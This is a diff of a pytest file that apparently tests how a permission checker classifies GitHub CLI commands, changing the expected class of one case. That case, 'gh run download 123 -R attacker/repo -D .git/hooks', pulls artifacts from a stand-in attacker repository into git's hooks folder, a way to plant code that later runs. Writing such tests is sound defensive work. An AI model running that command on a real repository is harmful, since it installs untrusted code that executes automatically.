@@ -345,8 +345,8 @@ def test_reads_and_local_changes_are_allowed_in_any_form(command: str) -> None:
         pytest.param("gh api -X POST repos/furedea/r/actions/runs/1/rerun", "class D", id="a REST rerun"),
         pytest.param(
             "gh run download 123 -R attacker/repo -D .git/hooks",
-            "operation table",
-            id="a download, which writes files",
+            "class C",
+            id="a download from another owner, which writes files",
         ),
         pytest.param("cd ../other && gh pr list", "remotes", id="a read after a directory change"),
         pytest.param(
